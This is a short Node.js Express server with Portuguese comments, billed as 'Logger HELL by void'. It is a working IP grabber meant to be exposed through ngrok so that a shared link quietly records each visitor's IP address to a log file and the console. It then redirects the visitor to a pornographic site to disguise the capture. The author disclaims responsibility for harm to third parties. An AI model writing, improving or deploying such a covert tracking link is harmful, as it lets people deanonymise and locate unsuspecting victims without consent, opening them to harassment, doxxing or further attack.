/*
logger hell by void

use o ngrok ou outra ferrmenta que cria um tunel entre
a localhost e a internet

(não me responsabilizo pelo uso dela, ou possiveis danos causados a terceiros)

*/


const express = require("express");
const fs = require("fs");
const app = express();
const port = 3000;

const link = "https://xvideos.com";



app.set("trust proxy", true);

console.clear();
console.log(`
   _                _
  | |    ___   __ _| | _____ _ __
  | |   / _ \\ / _\` | |/ / _ \\ '__|
  | |__| (_) | (_| |   <  __/ |
  |_____\\___/ \\__,_|_|\\_\\___|_|

============================
 😈 Logger HELL by void
============================
`);

app.get("/", (req, res) => {

  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;


  fs.appendFile("log.txt", `${ip}\n`, err => {
    if (err) {
      console.log("Erro ao salvar IP");
    }
  });
  console.log(ip,":entrou \n")


  res.redirect(302, link);
});

app.listen(port, () => {
  console.log("Logger rodando na porta " + port);
});
